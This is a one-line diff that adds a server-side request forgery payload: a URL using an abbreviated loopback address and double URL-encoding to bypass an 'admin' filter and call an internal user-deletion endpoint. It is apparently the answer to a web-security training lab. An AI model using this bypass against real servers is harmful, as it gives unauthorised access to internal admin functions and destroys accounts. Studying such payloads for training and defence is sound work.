@@ -1,0 +1,1 @@
+http://127.1/%25%36%31dmin/delete?username=carlos
